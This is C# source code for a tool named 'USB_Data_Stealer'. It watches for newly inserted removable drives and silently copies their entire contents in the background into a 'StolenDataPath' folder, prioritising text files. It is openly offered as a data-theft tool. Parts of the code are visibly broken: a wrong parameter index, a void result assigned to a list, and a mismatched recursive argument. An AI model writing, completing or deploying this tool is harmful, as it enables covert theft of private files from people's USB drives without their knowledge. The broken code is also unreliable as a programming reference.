#region

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;

#endregion

namespace USB_Data_Stealer
{
    public class UsbStealer : INotifyPropertyChanged
    {
        public delegate void NewDriverAdded(DriveInfo driveInfo);

        private bool _isMonitoring;
      
        public UsbStealer()
        {


            WhitelistDrivers = GetCurrentRemovableDrivers().ToList();

           Log.Append(new Log.Message(Log.EventType.Info, "Initialized."));

        }



        private List<DriveInfo> WhitelistDrivers { get; set; }
        public string StolenDataPath { get; set; }

        public int MonitorFreshRate { get; set; }

        public bool IsMonitoring
        {
            get { return _isMonitoring; }
            private set
            {
                if (IsMonitoring == value) return;
                _isMonitoring = value;
                OnPropertyChanged(new PropertyChangedEventArgs("IsMonitoring"));
                Log.Append(new Log.Message(Log.EventType.Info, "Monitor status changed to: " + IsMonitoring));
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;

        private static class IntelligentFileCopier
        {
            public static void BeginTransfer(string inputPath,string outputPath,IEnumerable<string> precedenceExstensions )
            {
                var thread  = new Thread(CopyFolder);
                DirectoryInfo a = new DirectoryInfo(outputPath);
                thread.Start(new List<object> {new DirectoryInfo(inputPath),new DirectoryInfo(outputPath),precedenceExstensions.ToArray()});
            }
            private static void CopyFolder(object parameters)
            {




                DirectoryInfo sourceDir = ((List<object>)parameters)[0] as DirectoryInfo;
                DirectoryInfo targetDir = ((List<object>)parameters)[1] as DirectoryInfo;
                var precedenceExstensions = ((List<object>)parameters)[0] as IEnumerable<string>;


                var sourceFiles = GetAllAccessibleFiles(sourceDir.FullName);
                var sortedByExtension = sourceFiles.OrderBy(cus => precedenceExstensions.Contains(cus.Extension));
                int a = 0;
                List<FileInfo> precedenceFiles = new List<FileInfo>();
                List<FileInfo> otherFiles = new List<FileInfo>();
                foreach (var file in  sourceFiles)
                {
                    if (precedenceExstensions.Contains(file.Extension))
                        precedenceFiles.Add(file);
                    else
                
                        otherFiles.Add(file);
                    
                }
                List<FileInfo> sortedList = precedenceFiles.AddRange(otherFiles);

                //Copiare i files in ordine di 1) Estensione 2) Dimensione



                try
                {
                    foreach (DirectoryInfo dir in sourceDir.GetDirectories())
                        CopyFolder(new[] { dir, targetDir.CreateSubdirectory(dir.Name) });
                    foreach (FileInfo file in sourceDir.GetFiles())
                        file.CopyTo(Path.Combine(targetDir.FullName, file.Name),true);
                }
                catch (Exception)
                {
                    //ignored
                }
            }
            private static List<FileInfo> GetAllAccessibleFiles(string rootPath, List<FileInfo> alreadyFound = null)
            {
                if (alreadyFound == null)
                    alreadyFound = new List<FileInfo>();
                var di = new DirectoryInfo(rootPath);
                var dirs = di.EnumerateDirectories();
                alreadyFound = dirs.Where(dir => (dir.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden).Aggregate(alreadyFound, (current, dir) => GetAllAccessibleFiles(dir.FullName, current));

                var files = Directory.GetFiles(rootPath);
                alreadyFound.AddRange(files.Select(file => new FileInfo(file)));

                return alreadyFound;
            }
        }

        public event NewDriverAdded OnNewDriverAdded;

        private void CheckNewDrivers()
        {
            do
            {
               
                foreach (DriveInfo currentDriver in GetCurrentRemovableDrivers())
                {
                    DriveInfo check =
                        WhitelistDrivers.FirstOrDefault(
                            x => x.RootDirectory.Root.Name == currentDriver.RootDirectory.Root.Name);
                    if (check == null)
                    {
                        OnOnNewDriverAdded(currentDriver);
                    }
                        }
                WhitelistDrivers = GetCurrentRemovableDrivers().ToList();
                Thread.Sleep(MonitorFreshRate);
            } while (IsMonitoring);
        }

        private static IEnumerable<DriveInfo> GetCurrentRemovableDrivers()
            => DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Removable);

        public void StartMonitoring()
        {
            var thread = new Thread(CheckNewDrivers) {IsBackground = true};
            thread.Start();
            IsMonitoring = true;
        }

        public void StopMonitoring()
        {
            IsMonitoring = false;
        }


        private void OnPropertyChanged(PropertyChangedEventArgs e)
        {
            PropertyChanged?.Invoke(this, e);
        }

        private void OnOnNewDriverAdded(DriveInfo driveinfo)
        {
            WhitelistDrivers.Add(driveinfo);

            Log.Append(new Log.Message(Log.EventType.Info,
                    "New Driver: " + driveinfo.VolumeLabel + " (" + driveinfo.Name + ")"));
            // CopyDirectory(driveinfo.RootDirectory.FullName, StolenDataPath);
            IntelligentFileCopier.BeginTransfer(driveinfo.RootDirectory.FullName,Path.Combine(StolenDataPath,driveinfo.VolumeLabel),new[]{".txt"});
            Log.Append(new Log.Message(Log.EventType.Info,"Data transferring from  \"" + driveinfo.RootDirectory.FullName + "\" to \"" + StolenDataPath +"\" started." ));
            OnNewDriverAdded?.Invoke(driveinfo);
        }

        public static class Log
        {
            public  delegate void NewLogMessageAppended(Message message);

            public enum EventType
            {
                Info,
                Error
            }

            static Log()
            {
                LogData = new List<Message>();
            }

            public static string LogPath { get; set; }
            public  const string LogFileName = "log.txt";

            public static string LogFullPath => Path.Combine(LogPath, LogFileName);
            public static bool EnableFileLogging { get; set; }
            public static List<Message> LogData { get; }

            public static event NewLogMessageAppended OnNewLogMessageAppended;

            public static void Append(Message message)
            {
                Debug.WriteLine(message.ToString());
                try
                {
                    LogData.Add(message);
                    using (var sw = new StreamWriter(LogFullPath))
                    {
                        sw.WriteLine(message.ToString());
                    }
                }
                catch (Exception ex)
                {
                   
                    LogData.Add(new Message(EventType.Error, "Couldn't save Log Event to the specified file, " + ex.Message));
                    EnableFileLogging = false;

                }
                finally
                {
                    OnOnNewLogMessageAppended(message);
                }
            }

            private static void OnOnNewLogMessageAppended(Message message)
            {
                OnNewLogMessageAppended?.Invoke(message);
            }

            public class Message
            {
                public Message(EventType eventType, string text)
                {
                    EventType = eventType;
                    Text = text;
                    DateTime = DateTime.Now;
                }

                public DateTime DateTime { get; }
                public EventType EventType { get; }
                public string Text { get; }

                public override string ToString()
                {
                    return DateTime.Now + " [" + EventType + "] " + Text;
                }
            }
        }
    }
}